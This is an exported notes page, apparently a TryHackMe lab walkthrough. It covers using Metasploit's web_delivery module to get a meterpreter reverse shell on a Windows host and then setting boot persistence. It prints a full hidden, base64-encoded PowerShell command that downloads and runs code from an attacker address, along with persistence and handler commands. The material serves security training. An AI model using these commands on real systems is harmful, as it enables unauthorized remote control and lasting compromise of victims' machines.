<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Task 4 Adoption into the Collective</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Task 4 Adoption into the Collective</h1><br/><strong>Now that we've thoroughly compromised our target machine, let's return to our exploitation tools so that we can gain remote shell access and persistence.<br /><br /><br />                                                                                        <br /> Return to your attacker machine for  this next bit. Since we know our victim machine is running Windows  Defender, let's go ahead and try a different method of payload delivery!  For this, we'll be using the script web delivery exploit within  Metasploit. Launch Metasploit now and select  'exploit/multi/script/web_delivery' for use.<br />                            <br />                            <br />                            <br />                                                                                         <br /> First, let's set the target to PSH (PowerShell). Which target number is PSH?  <br /></strong>     use exploit/multi/script/web_delivery<br />     info<br />     <br />  <strong>   Answer: 2<br /> <br /> <br /> <br /> After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network.                                                     <br />                        <br />                        <br />                        <br />Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.  <br /><br /><br /><br />Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched. In this case, I've found it particularly helpful to host a simple python web server (python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. Once you've run this command, return to our attacker machine and note that our reverse shell has spawned. <br /><br />    </strong><div class="codebox"><div class="codebox">powershell.exe&nbsp;-nop&nbsp;-w&nbsp;hidden&nbsp;-e&nbsp;WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABBAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAEEALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABBAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOQAuADIAMwA3AC4AMwA2ADoAOAAwADgAMAAvAEsAQgBKAEoAZABaAE0AMABTAFYASwA3AC8AcQB1AHcAZgBaAEIAUgAzAGoAUQBtADIAbwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOQAuADIAMwA3AC4AMwA2ADoAOAAwADgAMAAvAEsAQgBKAEoAZABaAE0AMABTAFYASwA3ACcAKQApADsA</div></div><br /><br /><br />Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup. <br /><br />   <strong> Answer: run persistence -x<br /><br /><br /><br />Run this command now with options that allow it to connect back to your host machine should the system reboot. Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice. Congrats, you've now gain full control over the remote host and have established persistence for further operations!<br /><br /></strong>    run persistence -x<br />     <br />    outside the meterpreter shell:<br />    <a href="https://en.redinskala.com/starting-a-handler-with-metasploit/">https://en.redinskala.com/starting-a-handler-with-metasploit/</a><br /><br />    use multi/handler<br />    set payload windows/meterpreter/reverse_tcp     <strong>                   <br /></strong></div></body></html>